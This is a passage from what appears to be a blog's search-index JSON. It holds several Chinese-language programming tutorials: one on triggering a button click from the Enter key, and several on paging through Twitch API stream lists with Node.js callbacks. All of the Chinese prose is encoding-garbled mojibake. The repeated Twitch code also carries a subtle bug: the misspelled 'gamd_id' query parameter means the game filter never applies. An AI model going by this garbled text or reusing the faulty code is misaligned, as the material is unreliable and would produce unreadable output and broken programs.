ç‚ºç•¶ A è·Ÿ B åŒæ™‚ç™¼ requestï¼Œå‡è¨­ A æ’åœ¨å‰é¢ï¼Œé‚£ B å°±è¦ç­‰ A çµæŸå¾Œæ‰æœƒè¼ªåˆ°ä»–ï¼Œæ›å¥è©±èªªå°±æ˜¯è¦ç­‰å‰ä¸€å€‹åšå®Œæ‰è¼ªä¸‹ä¸€å€‹å•¦ï¼Œæ‰€ä»¥ç•¶ç„¶é€Ÿåº¦æœƒè®Šæ…¢ã€‚","link":"/2022/03/03/transaction-and-lock/"},{"title":"è®“ click å’Œ enter è§¸ç™¼åŒå€‹äº‹ä»¶","text":"é€™æ‹›é‚„ä¸éŒ¯ã€‚ ç°¡è¿°åœ¨é‡åˆ°è¡¨å–®çš„æ™‚å€™æœƒå¸Œæœ›é™¤äº†ã€ŒæŒ‰ä¸‹æŒ‰éˆ•ã€ä»¥å¤–é‚„èƒ½æ”¯æ´ã€ŒæŒ‰ä¸‹ Enter éµã€ã€‚ ä½†éº»ç…©çš„åœ°æ–¹åœ¨æ–¼ä¸€å€‹å¿…é ˆç¶ click äº‹ä»¶ï¼Œä¸€å€‹å¿…é ˆç¶ keypress äº‹ä»¶ï¼Œä¸¦ä¸”è¦åˆ¤æ–·ä½¿ç”¨è€…æŒ‰ä¸‹çš„æ˜¯ Enter æ‰åšè™•ç†ï¼Œæ‰€ä»¥ä½ å¯èƒ½æœƒé€™æ¨£å¯«ï¼š 1234&lt;div&gt; &lt;input type=\"text\"&gt; &lt;button&gt;send&lt;/button&gt;&lt;/div&gt; 12345678910111213141516171819// è¼¸å…¥æ¡†document .querySelector('[type=text]') .addEventListener('keydown', handlerEnter)// æŒ‰éˆ•document .querySelector('button') .addEventListener('click', handlerClick)// click çš„ handlerfunction handlerClick() { console.log('button click!')}// enter çš„ handlerfunction handlerEnter(e) { if (e.key === 'Enter') { console.log('press enter!') }} ä½†é€šå¸¸å…©å€‹è¦åšçš„äº‹æƒ…éƒ½æ˜¯ä¸€æ¨£çš„ï¼Œåªå·®åœ¨ keypress è¦åˆ¤æ–·æ˜¯ä¸æ˜¯ Enter çš„æµç¨‹ï¼Œå°è‡´é€™å…©å€‹ function æ²’è¾¦æ³•å¯«åœ¨ä¸€èµ·ï¼Œé€™å¾ˆè®“äººå‚·è…¦ç­‹ã€‚ è®“ä½ çš„è…¦è¢‹è½‰å€‹æ–¹å‘æ²’éŒ¯ï¼Œå¯ä»¥è½‰å€‹æ–¹å‘ä¾†æ€è€ƒï¼Œç‚ºä»€éº¼ä¸è®“ã€ŒæŒ‰ä¸‹ enter æ™‚è‡ªå‹•åŸ·è¡Œ click é€™å€‹å‹•ä½œã€å°±å¥½ï¼Ÿ æ‰€ä»¥å…¶å¯¦èƒ½æ”¹æˆé€™æ¨£ï¼š 123456789101112131415161718// è¼¸å…¥æ¡†document .querySelector('[type=text]') .addEventListener('keydown', (e) =&gt; { // åˆ¤æ–·æ˜¯ä¸æ˜¯ Enter if (e.key === 'Enter') { // æ˜¯çš„è©±å°±æŠŠæŒ‰éˆ• click document.querySelector('button').click() }})// æŒ‰éˆ•document .querySelector('button') .addEventListener('click', handler)// ç¾åœ¨åªè¦ä¸€å€‹ handler å°±å¤ äº†function handler() { console.log('click!')}","link":"/2022/01/22/trigger-an-event-on-click-and-enter/"},{"title":"ä¸²æ¥ Twitch çš„ APIï¼ˆæŒ‘æˆ°é¡Œï¼‰","text":"ä¾†è‡ª mentor-program-5th week4 çš„æŒ‘æˆ°é¡Œã€‚ è§£é¡Œæ–¹å‘é€™ä¸€é¡Œçš„ç›®æ¨™æ˜¯å°å‡ºã€Œæœ€å—æ­¡è¿çš„ 200 å€‹å¯¦æ³åˆ—è¡¨ã€ï¼Œæœƒç”¨åˆ°çš„è³‡æ–™æ˜¯é€™å…©å€‹ï¼š Get Games Get Streams ç°¡å–®ä¾†èªªå°±æ˜¯å…ˆå–å¾—ã€ŒéŠæˆ² idã€ï¼Œå†åˆ©ç”¨éŠæˆ² id å»å–å¾—ã€Œå¯¦æ³è³‡æ–™ã€é€™æ¨£å­ã€‚ ä¸éè¦æ³¨æ„ Get Streams ä¸€æ¬¡æœ€å¤šåªèƒ½æŠ“ 100 ç­†è³‡æ–™ï¼Œè¦å–å¾— 200 ç­†çš„è©±æœƒè®Šå¾—è¤‡é›œä¸€é»ï¼Œæ‰€ä»¥æˆ‘æœƒå»ºè­°å…ˆå¯«ä¸€å€‹ç°¡å–®ç‰ˆçš„ï¼Œåˆ—å‡º 100 ç­†å¯¦æ³åˆ—è¡¨å°±å¥½ï¼Œæ¥è‘—å†ä¾†æƒ³è¦æ€éº¼å„ªåŒ–ã€‚ ç°¡å–®ç‰ˆé€™è£¡è¦åšçš„äº‹æƒ…å¾ˆç°¡å–®ï¼Œæˆ‘å€‘åªè¦åšå…©ä»¶äº‹å°±å¥½ï¼š æ ¹æ“šè¼¸å…¥å»æ‰¾å‡ºéŠæˆ² id æ‹¿éŠæˆ² id å»æ‰¾å‡ºå¯¦æ³åˆ—è¡¨ é€™è£¡å°±ç›´æ¥è²¼åŸå§‹ç¢¼ï¼Œæ­¥é©Ÿéƒ½å¯«åœ¨è¨»è§£è£¡é¢äº†ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/* é™½æ˜¥ç‰ˆï¼Œå¯ä»¥å–å¾— 100 ç­†ã€Œæœ€å—æ­¡è¿çš„å¯¦æ³åˆ—è¡¨ã€*/// è¼‰å…¥ dotenvï¼ˆå–å¾—ç’°å¢ƒè®Šæ•¸ï¼‰require('dotenv').config()// ç™¼é€ request çš„æ¨¡çµ„const request = require('request')// API ç¶²å€const BASE_URL = 'https://api.twitch.tv/helix'// å–å¾—éŠæˆ² id çš„ requestfunction searchGame(name, callback) { // æ²’è¼¸å…¥éŠæˆ²åç¨± if (!name) { return console.log('è«‹è¼¸å…¥éŠæˆ²åç¨±') } request({ url: `${BASE_URL}/games?name=${name}`, headers: { 'Authorization': process.env.ACCESS_TOKEN, 'Client-ID': process.env.CLIENT_ID } }, callback)}// æ‹¿åˆ°éŠæˆ² id çš„ callbackfunction handlerGameId(err, res, body) { // éŒ¯èª¤è™•ç† if (err) { return console.log(err) } // æ‹¿åˆ°éŠæˆ² id å¾Œ const gameId = JSON.parse(body).data[0].id // å†ç™¼ request å–å¾—å¯¦æ³åˆ—è¡¨ getStreams(gameId, handlerStreams)}// å–å¾—å¯¦æ³åˆ—è¡¨çš„ requestfunction getStreams(gameId, callback) { // æ²’è¼¸å…¥éŠæˆ² id if (!gameId){ return console.log('è«‹è¼¸å…¥éŠæˆ² id') } request({ // ä¸€æ¬¡æŠ“ 100 ç­† url: `${BASE_URL}/streams?first=100&amp;gamd_id=${gameId}`, headers: { 'Authorization': process.env.ACCESS_TOKEN, 'Client-ID': process.env.CLIENT_ID } }, callback)}// æ‹¿åˆ°å¯¦æ³åˆ—è¡¨çš„ callbackfunction handlerStreams(err, res, body) { // éŒ¯èª¤è™•ç† if (err) { return console.log(err) } // å–å‡ºå¯¦æ³è³‡æ–™ const streams = JSON.parse(body).data // å°å‡ºå¯¦æ³ä¸»åç¨±ã€id for(let stream of streams) { console.log('==============') console.log(`å¯¦æ³ä¸»åç¨±ï¼š${stream.user_name}`) console.log(`å¯¦æ³ä¸» idï¼š${stream.user_id}`) console.log(`è§€çœ‹äººæ•¸ï¼š${stream.viewer_count}`) }}/* node twitch1.js 'League of Legends' åŸ·è¡Œæµç¨‹ï¼š 1. é€å‡ºè«‹æ±‚ï¼Œå–å¾—éŠæˆ² id =&gt; searchGame 2. æ‹¿åˆ°éŠæˆ² id =&gt; handlerGameId (callback) 3. åˆ©ç”¨éŠæˆ² id é€å‡ºè«‹æ±‚ï¼Œå–å¾—å¯¦æ³åˆ—è¡¨ =&gt; getStreams 4. æ‹¿åˆ°å¯¦æ³åˆ—è¡¨ï¼Œä¸¦å°å‡ºå¯¦æ³ä¸»åç¨±ã€id =&gt; handlerStreams (callback)*/searchGame(process.argv[2], handlerGameId) æ¯”è¼ƒé‡è¦çš„åœ°æ–¹åœ¨æ–¼ åŸ·è¡Œé †åºï¼Œæˆ‘å€‘å¸Œæœ›çš„é †åºæ˜¯ï¼šhandlerGameId æ‹¿åˆ° id å¾Œæ‰åŸ·è¡Œ getStreams æ‰€ä»¥ getStreams ä¸€å®šæ˜¯åœ¨ handlerGameId è£¡é¢è¢«å‘¼å«çš„ï¼Œå¦‚æœä½ å¯«åœ¨åˆ¥çš„åœ°æ–¹ï¼Œçµæœä¸€å®šæ˜¯éŒ¯çš„ï¼Œå¯ä»¥åƒè€ƒ ç†è§£ä»€éº¼æ˜¯ race-condition å›°é›£ç‰ˆç°¡å–®ç‰ˆæ²’æœ‰å•é¡Œçš„è©±ï¼Œæ¥ä¸‹ä¾†è¦åšçš„äº‹æƒ…å…¶å¯¦ä¹Ÿä¸è¤‡é›œï¼Œå…¶å¯¦å°±æ˜¯åœ¨ç™¼ä¸€æ¬¡è«‹æ±‚å»æ‰¾å‡ºç¬¬äºŒç­†å¯¦æ³åˆ—è¡¨è³‡æ–™é€™æ¨£å­è€Œå·²ã€‚ å¯èƒ½æœƒç¢°åˆ°çš„ä¸€å€‹å•é¡Œæ˜¯ã€Œè¦æ€éº¼æŠ“ç¬¬äºŒç­†å¯¦æ³è³‡æ–™ï¼Ÿã€ é—œæ–¼é€™å€‹å•é¡Œï¼Œä½ å¯ä»¥å…ˆè§€å¯Ÿä¸€ä¸‹ï¼Œåœ¨æ‹¿åˆ°ç¬¬ä¸€ç­†å¯¦æ³è³‡æ–™çš„æ™‚å€™ï¼Œè³‡æ–™è£¡æœ‰å€‹ pagination çš„æ¬„ä½ï¼š 1234567891011{ \"data\": [ { \"id\": \"41375541868\", ... }, ], \"pagination\": { \"cursor\": \"eyJiIjp7IkN1cnNvciI6ImV5SnpJam8zT0RNMk5TNDBORFF4TlRjMU1UY3hOU3dpWkNJNlptRnNjMlVzSW5RaU9uUnlkV1Y5In0sImEiOnsiQ3Vyc29yIjoiZXlKeklqb3hOVGs0TkM0MU56RXhNekExTVRZNU1ESXNJbVFpT21aaGJITmxMQ0owSWpwMGNuVmxmUT09In19\" }} è£¡é¢çš„é‚£å€‹ cursor å°±æ˜¯ç”¨ä¾†æ‹¿ä¸‹ä¸€ç­†å¯¦æ³è³‡æ–™çš„æ™‚å€™éœ€è¦ç”¨åˆ°çš„æ±è¥¿ï¼Œæˆ‘è‡ªå·±æ˜¯æŠŠå®ƒç•¶ä½œä¸€å€‹ã€Œè¨˜éŒ„é»ã€çš„æ„æ€ï¼Œæˆ–ä½ ä¹Ÿå¯ä»¥è®€ä¸€ä¸‹ API æ–‡ä»¶çš„èªªæ˜ï¼š Cursor for backward pagination: tells the server where to start fetching the next set of results, in a multi-page response. The cursor value specified here is from the pagination response field of a prior query. ç°¡å–®ä¾†èªªå°±æ˜¯å‘Šè¨´å¾Œç«¯ã€Œå¾å“ªè£¡é–‹å§‹æ’ˆè³‡æ–™ã€çš„æ„æ€å•¦ï¼æˆ‘å€‘å‰›å‰›ä¸æ˜¯å·²ç¶“æŠ“äº† 100 ç­†å—ï¼Ÿï¼Œæ‰€ä»¥ç¬¬äºŒæ¬¡ç™¼è«‹æ±‚æ™‚è¦åŠ ä¸Š cursor ä¾†å‘Šè¨´å¾Œç«¯ã€Œæˆ‘è¦å¾é€™è£¡é–‹å§‹æ‹¿è³‡æ–™å“¦ï¼ˆç¬¬ 101 ç­†ï¼‰ã€ï¼Œå¤§æ¦‚æ˜¯é€™æ¨£çš„æ¦‚å¿µã€‚ æ²’å•é¡Œå¾Œï¼Œæ¥ä¸‹ä¾†å°±æ˜¯æ€è€ƒè§£é¡Œæ–¹å‘ï¼š é€å‡ºè«‹æ±‚ï¼Œæ‹¿åˆ°éŠæˆ² id ç”¨éŠæˆ² id è«‹æ±‚ç¬¬ä¸€ç­†å¯¦æ³åˆ—è¡¨ æ‹¿åˆ°å¯¦æ³åˆ—è¡¨å¾Œï¼ŒæŠŠç¬¬ä¸€ç­†è³‡æ–™å­˜èµ·ä¾† ç”¨éŠæˆ² id è«‹æ±‚ç¬¬äºŒç­†å¯¦æ³åˆ—è¡¨ï¼Œé€™æ¬¡è¦åŠ ä¸Š cursorï¼Œä¾†å¾ç¬¬ 101 ç­†é–‹å§‹æŠ“ æ‹¿åˆ°å¯¦æ³åˆ—è¡¨å¾Œï¼ŒæŠŠç¬¬äºŒç­†è³‡æ–™å­˜èµ·ä¾† æŠŠæ‰€æœ‰è³‡æ–™å°å‡ºä¾† é€™è£¡è¦ç‰¹åˆ¥æ³¨æ„æˆ‘å€‘å¾—æ–°å¢å…©å€‹è®Šæ•¸ gameIdã€allStreams ä¾†å„²å­˜ã€ŒéŠæˆ² idã€èˆ‡ã€Œæ‰€æœ‰å¯¦æ³åˆ—è¡¨ã€ã€‚ ç‚ºä»€éº¼ï¼Ÿå› ç‚ºä½ åœ¨æ‹¿åˆ°ç¬¬ä¸€ç­†å¯¦æ³è³‡æ–™çš„æ™‚å€™ï¼Œcallback çš„åƒæ•¸è£¡æ˜¯ä¸æœƒæœ‰éŠæˆ² id çš„ï¼Œå¦‚æœè¦åœ¨é€™å€‹ callback è£¡é€å‡ºç¬¬äºŒæ¬¡è«‹æ±‚ï¼Œå°±ä¸€å®šè¦æœ‰éŠæˆ² id çš„é€™å€‹å€¼ï¼Œæ‰€ä»¥æ‰è¦å»ºç«‹ä¸€å€‹è®Šæ•¸ä¾†å„²å­˜ã€‚ è‡³æ–¼ allStreams ä¹Ÿä¸€æ¨£ï¼Œæˆ‘å€‘æ¯æ¬¡éƒ½åªæœƒæ‹¿åˆ° 100 ç­†å¯¦æ³è³‡æ–™ï¼Œæ‰€ä»¥æ‹¿åˆ°è³‡æ–™çš„æ™‚å€™ç•¶ç„¶å¾—å­˜èµ·ä¾†ï¼Œæœ€å¾Œæ‰æœ‰è¾¦æ³•æ¹Šæˆ 200 ç­†ã€‚ æ¥ä¸‹ä¾†ä¸€æ¨£åƒè€ƒåŸå§‹ç¢¼è·Ÿè¨»è§£ï¼Œæ‡‰è©²éƒ½å¯«å¾—è »æ¸…æ¥šçš„äº†ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108// è¼‰å…¥ dotenvï¼ˆå–å¾—ç’°å¢ƒè®Šæ•¸ï¼‰require('dotenv').config()// ç™¼é€ request çš„æ¨¡çµ„const request = require('request')// API ç¶²å€const BASE_URL = 'https://api.twitch.tv/helix'// å„²å­˜éŠæˆ² id let gameId = null// å„²å­˜æ‰€æœ‰å¯¦æ³åˆ—è¡¨è³‡æ–™let allStreams = []// å–å¾—éŠæˆ² id çš„ requestfunction searchGame(name, callback) { // æ²’è¼¸å…¥éŠæˆ²åç¨± if (!name) return console.log('è«‹è¼¸å…¥éŠæˆ²åç¨±') request({ url: `${BASE_URL}/games?name=${name}`, headers: { 'Authorization': process.env.ACCESS_TOKEN, 'Client-ID': process.env.CLIENT_ID } }, callback)}// æ‹¿åˆ°éŠæˆ² id çš„ callbackfunction handlerGameId(err, res, body) { // éŒ¯èª¤è™•ç† if (err) { return console.log(err) } // æ‹¿åˆ°éŠæˆ² id å¾Œï¼ŒæŠŠ id å„²å­˜èµ·ä¾†ã€‚ gameId = JSON.parse(body).data[0].id // æ¥è‘—ç™¼ request å–å¾—ç¬¬ä¸€ç­†å¯¦æ³åˆ—è¡¨ getFirstStreams(gameId, handlerFirstStreams)}// å–å¾—ç¬¬ä¸€ç­†å¯¦æ³åˆ—è¡¨çš„ requestfunction getFirstStreams(gameId, callback) { // æ²’è¼¸å…¥éŠæˆ² id if (!gameId){ return console.log('è«‹è¼¸å…¥éŠæˆ² id') } request({ // ä¸€æ¬¡æŠ“ 100 ç­† url: `${BASE_URL}/streams?first=100&amp;gamd_id=${gameId}`, headers: { 'Authorization': process.env.ACCESS_TOKEN, 'Client-ID': process.env.CLIENT_ID } }, callback)}// æ‹¿åˆ°ç¬¬ä¸€ç­†å¯¦æ³åˆ—è¡¨çš„ callbackfunction handlerFirstStreams(err, res, body) { // éŒ¯èª¤è™•ç† if (err) { return console.log(err) } // å–å‡ºå¯¦æ³è³‡æ–™ const streams = JSON.parse(body).data // å–å¾—è¨˜éŒ„é»ä½ç½®ï¼ˆåˆ†é ï¼‰ const cursor = JSON.parse(body).pagination.cursor // æŠŠè³‡æ–™æ‹¼èµ·ä¾† allStreams = allStreams.concat(streams) // å†ç™¼ä¸€æ¬¡è«‹æ±‚ï¼Œå–å¾—ç¬¬äºŒç­†å¯¦æ³åˆ—è¡¨ getSecondStreams(gameId, cursor, handlerSecondStreams)}// å–å¾—ç¬¬äºŒç­†å¯¦æ³åˆ—è¡¨çš„ requestfunction getSecondStreams(gameId, cursor, callback) { // æ²’æœ‰è¼¸å…¥ id æˆ– è¨˜éŒ„é» if (!gameId || !cursor) return console.log('è«‹è¼¸å…¥ id åŠ è¨˜éŒ„é»') request({ url: `${BASE_URL}/streams?after=${cursor}&amp;first=100&amp;gamd_id=${gameId}`, headers: { 'Authorization': process.env.ACCESS_TOKEN, 'Client-ID': process.env.CLIENT_ID } }, callback)}// å–å¾—ç¬¬äºŒç­†å¯¦æ³åˆ—è¡¨çš„ callbackfunction handlerSecondStreams(err, res, body) { // éŒ¯èª¤è™•ç† if (err) { return console.log(err) } // å–å‡ºå¯¦æ³è³‡æ–™ const streams = JSON.parse(body).data // æŠŠè³‡æ–™æ‹¼èµ·ä¾†ï¼ˆé€™æ™‚å€™å°±æœ‰ 200 ç­†è³‡æ–™äº†ï¼‰ allStreams = allStreams.concat(streams) // å°å‡ºå¯¦æ³ä¸»åç¨±ã€id å’Œè§€çœ‹äººæ•¸ for(let stream of allStreams) { console.log('=============') console.log(`å¯¦æ³ä¸»ï¼š${stream.user_name}`) console.log(`idï¼š${stream.user_id}`) console.log(`è§€çœ‹äººæ•¸ï¼š${stream.viewer_count}`) }}/* åŸ·è¡Œæµç¨‹ï¼š 1. ç™¼å‡ºè«‹æ±‚ï¼Œå–å¾—éŠæˆ² id =&gt; searchGame 2. æ‹¿åˆ°éŠæˆ² id å¾Œ =&gt; handlerGameId (callback) 3. åˆ©ç”¨éŠæˆ² id ç™¼å‡ºè«‹æ±‚ï¼Œå–å¾—ç¬¬ä¸€ç­†å¯¦æ³åˆ—è¡¨ =&gt; getFirstStreams 4. æ‹¿åˆ°ç¬¬ä¸€ç­†å¯¦æ³åˆ—è¡¨ï¼ŒæŠŠè³‡æ–™è·Ÿè¨˜æ†¶é»å„²å­˜èµ·ä¾† =&gt; handlerFirstStreams (callback) 5. ç™¼å‡ºè«‹æ±‚ï¼Œå–å¾—ç¬¬äºŒç­†å¯¦æ³åˆ—è¡¨ =&gt; getSecondStreams 6. æ‹¿åˆ°ç¬¬äºŒç­†å¯¦æ³åˆ—è¡¨ï¼ŒæŠŠè³‡æ–™å„²å­˜èµ·ä¾†ï¼Œæœ€å¾Œå°å‡ºå…§å®¹ =&gt; handlerSecondStreams (callback)*/searchGame(process.argv[2], handlerGameId) ä¸€æ¨£è¦æ³¨æ„åŸ·è¡Œé †åºï¼Œåªè¦æ˜¯éåŒæ­¥çš„ functionï¼Œçµæœéƒ½ä¸€å®šè¦ç”¨ callback ä¾†è™•ç†ã€‚ å›°é›£ç‰ˆï¼ˆå„ªåŒ–ï¼‰é€™è£¡æ˜¯æˆ‘æ…¢æ…¢ä¿®å‡ºä¾†çš„ï¼Œæˆ‘ä¹Ÿé‚„ä¸çŸ¥é“æ€éº¼è§£é‡‹æ¯”è¼ƒå¥½ï¼Œæ‰€ä»¥è«‹ç›´æ¥çœ‹è¨»è§£ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125// è¼‰å…¥ dotenvï¼ˆå–å¾—ç’°å¢ƒè®Šæ•¸ï¼‰require('dotenv').config()// ç™¼é€ request çš„æ¨¡çµ„const request = require('request')// API ç¶²å€const BASE_URL = 'https://api.twitch.tv/helix'// ä¸€æ¬¡è¦æŠ“çš„æ•¸é‡const BATCH_LIMIT = 50// å…¨éƒ¨è¦æŠ“çš„æ•¸é‡const TOTAL = 200// å–å¾—éŠæˆ² id çš„ requestfunction searchGame(name, callback) { // æ²’è¼¸å…¥éŠæˆ²åç¨± if (!name) return console.log('è«‹è¼¸å…¥éŠæˆ²åç¨±') request({ url: `${BASE_URL}/games?name=${name}`, headers: { 'Authorization': process.env.ACCESS_TOKEN, 'Client-ID': process.env.CLIENT_ID } }, callback)}// æ‹¿åˆ°éŠæˆ² id çš„ callbackfunction handlerGameId(err, res, body) { // éŒ¯èª¤è™•ç† if (err) { return console.log(err) } // æ‹¿åˆ°éŠæˆ² id å¾Œï¼ŒæŠŠ id å„²å­˜èµ·ä¾†ã€‚ const gameId = JSON.parse(body).data[0].id // å–å¾—æ‰€æœ‰å¯¦æ³åˆ—è¡¨ï¼Œæ‹¿åˆ°å¾Œå°å‡ºè³‡æ–™ getAllStreams(gameId, BATCH_LIMIT, TOTAL, handlerAllStream)}/* å–å¾—æ‰€æœ‰å¯¦æ³åˆ—è¡¨ gameId: éŠæˆ² id limit: ä¸€æ¬¡æŠ“å¹¾ç­†è³‡æ–™ total: ç¸½å…±æœ‰å¹¾ç­†è³‡æ–™ callback: æˆåŠŸçš„è©±æœƒæ‹¿åˆ°æ‰€æœ‰å¯¦æ³åˆ—è¡¨çš„è³‡æ–™ å‚™è¨»ï¼š é€™å€‹ function çš„ç”¨æ„å…¶å¯¦æ˜¯æŠŠ getStreams è·Ÿ handlerStreams çµ¦åŒ…è£èµ·ä¾†ï¼Œ é€™æ¨£å°±å¯ä»¥æŠŠéœ€è¦ç”¨åˆ°çš„è®Šæ•¸éƒ½ç¶åœ¨è£¡é¢ï¼Œä¾‹å¦‚ gameIdã€allStreamsï¼Œ å°±ä¸ç”¨å†å®£å‘Šæˆå…¨åŸŸè®Šæ•¸äº†*/function getAllStreams(gameId, limit, total, callback) { // å„²å­˜æ‰€æœ‰å¯¦æ³åˆ—è¡¨è³‡æ–™ let allStreams = [] // æ‹¿åˆ°éƒ¨åˆ†å¯¦æ³è³‡æ–™çš„ callbackï¼Œæœƒé‡è¤‡ä½¿ç”¨æ‰€ä»¥æ‰å¯«æˆå‘½åå‡½å¼ function handlerStreams(err, res, body) { // éŒ¯èª¤è™•ç† if (err) { return callback(err) } // å–å‡ºå¯¦æ³è³‡æ–™ const streams = JSON.parse(body).data // å–å¾—è¨˜éŒ„é»ä½ç½®ï¼ˆåˆ†é ï¼‰ const cursor = JSON.parse(body).pagination.cursor // æŠŠè³‡æ–™æ‹¼èµ·ä¾† allStreams = allStreams.concat(streams) // é‚„æ²’æŠ“å¤ ï¼Œåœ¨ç™¼ä¸€æ¬¡è«‹æ±‚ï¼Œé€™æ¬¡åŠ ä¸Š cursor if (allStreams.length &lt; total) { // éè¿´ handlerStreamsï¼Œç›´åˆ°æ•¸é‡æŠ“å¤ ç‚ºæ­¢ return getStreams(gameId, cursor, limit, handlerStreams) } // å¤ äº†çš„è©±ï¼Œåˆ‡å‰²æˆæ­£ç¢ºçš„æ•¸é‡åœ¨å›å‚³ï¼Œä¸ç„¶å¯èƒ½æœƒæœ‰è¶…éçš„å•é¡Œ // ç¬¬ä¸€å€‹åƒæ•¸æ˜¯ä»£è¡¨ errorï¼Œå¾Œé¢æ‰æ˜¯çœŸæ­£è¦å‚³å›å»çš„è³‡æ–™ return callback(null, allStreams.slice(0, total)) } // æŠ“ç¬¬ä¸€æ¬¡è³‡æ–™ // é€™å€‹é‚„æ²’æœ‰è¨˜æ†¶é»æ‰€ä»¥ cursor å‚³å…¥ null getStreams(gameId, null, limit, handlerStreams)}// æ‹¿åˆ°æ‰€æœ‰å¯¦æ³åˆ—è¡¨å¾Œçš„ callbackfunction handlerAllStream(err, streams) { // éŒ¯èª¤è™•ç† if (err) { return console.log(err) } // å°å‡ºå¯¦æ³è³‡è¨Š for (let stream of streams) { console.log('==============') console.log(`å¯¦æ³ä¸»åç¨±ï¼š${stream.user_name}`) console.log(`å¯¦æ³ä¸» idï¼š${stream.user_id}`) console.log(`è§€çœ‹äººæ•¸ï¼š${stream.viewer_count}`) }}// å–å¾—éƒ¨åˆ†å¯¦æ³åˆ—è¡¨çš„ requestfunction getStreams(gameId, cursor, limit, callback) { // é è¨­çš„ url let url = `${BASE_URL}/streams?first=${limit}&amp;gamd_id=${gameId}` // æ²’è¼¸å…¥éŠæˆ² id if (!gameId){ return console.log('è«‹è¼¸å…¥éŠæˆ² id') } // å¦‚æœæœ‰å‚³å…¥è¨˜æ†¶é»ï¼Œurl åŠ ä¸Š after åƒæ•¸ if (cursor) { url += `&amp;after=${cursor}` } request({ url: url, headers: { 'Authorization': process.env.ACCESS_TOKEN, 'Client-ID': process.env.CLIENT_ID } }, callback)}/* åŸ·è¡Œæµç¨‹ï¼š 1. ç™¼å‡ºè«‹æ±‚ï¼Œå–å¾—éŠæˆ² id =&gt; searchGame 2. æ‹¿åˆ°éŠæˆ² id å¾Œ =&gt; handlerGameId (callback) 3. åˆ©ç”¨éŠæˆ² id ç™¼å‡ºè«‹æ±‚ï¼Œå–å¾—æ‰€æœ‰çš„å¯¦æ³åˆ—è¡¨ =&gt; getAllStreams 4. æ‹¿åˆ°æ‰€æœ‰å¯¦æ³åˆ—è¡¨å¾Œï¼Œå°å‡ºå¯¦æ³è³‡è¨Š =&gt; handlerAllStreams (callback)*/searchGame(process.argv[2], handlerGameId)","link":"/2022/01/09/twich-api-challenge/"},{"title":"ä¸²æ¥ Twitch çš„ API","text":"ä¸€å€‹æ¯”è¼ƒå¤šé©—è­‰çš„ APIï¼Œæ‰€ä»¥ç´€éŒ„ä¸€ä¸‹ï¼Œä¸ç„¶ä»¥å¾Œè¦ç”¨åˆå¿˜è¨˜æ€éº¼ç”¨æœƒå¾ˆéº»ç…©ã€‚ æµç¨‹ç°¡è¿°ç°¡å–®ä¾†èªªï¼Œä½ è¦å…ˆæ‹¿åˆ°é€™ä¸‰æ¨£æ±è¥¿ï¼š access_token client_id client_secret access_token è·Ÿ client_id éƒ½æ˜¯è¦åœ¨ request header è£¡é¢å¸¶ä¸Šçš„é©—è­‰ç¢¼ï¼Œclient_secret æ˜¯ç”¨ä¾†å–å¾— access_token çš„æ™‚å€™æœƒç”¨åˆ°ã€‚ æµç¨‹ï¼š è¨»å†Š twitch å¸³è™Ÿ åœ¨ twitch developer ç¶²ç«™ä¸Šè¨»å†Šä¸€å€‹ APP åœ¨ APP é é¢è£¡é¢å–å¾— client_id è·Ÿ client_secretï¼ˆé€™å€‹è¦è¨˜å¾—æ¡ˆæ–°å¯†ç¢¼æ‰æœƒç”¢ç”Ÿï¼‰ å–å¾—é©—è­‰ tokenï¼Œæœ‰ä¸‰ç¨®å–å¾—æ–¹å¼ï¼Œæˆ‘ç›®å‰æ˜¯ç”¨ã€ŒClient credentials flowã€ã€‚ï¼ˆæ¯ä¸€ç¨®çš„å·®åˆ¥å¯ä»¥åƒè€ƒ é€™è£¡ï¼‰ å–å¾—é©—è­‰ tokenå‚™è¨»ï¼šæœ¬ä¾†å·æ‡¶æƒ³ç”¨ Postman ä¾†åšï¼Œä½†ä¼¼ä¹æœƒè¢« twitch æ“‹ï¼Œä¸€ç›´æ‹¿åˆ° 403 Invalid client_secret çš„å›å‚³å€¼ã€‚æ‰€ä»¥é€™é‚Šå»ºè­°é‚„æ˜¯ä¹–ä¹–ç”¨ Node.js ä¾†ç™¼æœƒæ¯”å¥½ã€‚ å°±æ˜¯é€™å€‹éƒ¨åˆ†æ¯”è¼ƒéº»ç…©ï¼Œæ‰€ä»¥ç‰¹åˆ¥è§£é‡‹ä¸€ä¸‹ã€‚ æŒ‰ç…§ å®˜æ–¹æ–‡ä»¶ çš„èªªæ˜ï¼Œä½ è¦å¸¶ä¸Š client_id è·Ÿ client_secret é€™å…©å€‹åƒæ•¸ç™¼ä¸€å€‹ POST è«‹æ±‚åˆ° https://id.twitch.tv/oauth2/token é€™å€‹ç¶²ç«™ï¼Œæ¥è‘—å°±æœƒåçµ¦ä½  access_tokenï¼Œå°±æ˜¯é€™éº¼ç°¡å–®ï¼Œç°¡å–®åˆ°æˆ‘æäº†ä¸€å€‹ä¸‹åˆã€‚ æ‰€ä»¥å°±å¯«ä¸€å€‹ request ä¾†ç™¼è«‹æ±‚ï¼š 12345678// è¼‰å…¥ request å¥—ä»¶const request = require('request')// ç™¼å‡º post è«‹æ±‚request.post(`https://id.twitch.tv/oauth2/token?client_id=${ä½ çš„client_id}&amp;client_secret=${ä½ çš„cliend_secret}&amp;grant_type=client_credentials`,(error, response, body) =&gt; { console.log('statusCode:', response.statusCode) console.log('body:', body)}) æˆåŠŸçš„è©±æ‡‰è©²å°±æœƒæ‹¿åˆ° tokenï¼š 12345{ \"access_token\":\"qwtjoiqjqwe2wqeqeyqieq\", // é€™è£¡æ˜¯æˆ‘äº‚æ‰“çš„ \"expires_in\":4740717, \"token_type\":\"bearer\"} å¿«æ¨‚ç™¼ requestæœ€éº»ç…©çš„éƒ¨åˆ†å®Œæˆå¾Œå°±èƒ½å¿«æ¨‚ä¸² API äº†ï¼Œé€™è£¡è¦ä¸²çš„æ˜¯ã€Œæœ€å—æ­¡è¿çš„éŠæˆ²åˆ—è¡¨ï¼ˆGet Top Gamesï¼‰ã€ï¼Œè©³ç´°èªªæ˜å¯ä»¥ é€™è£¡ 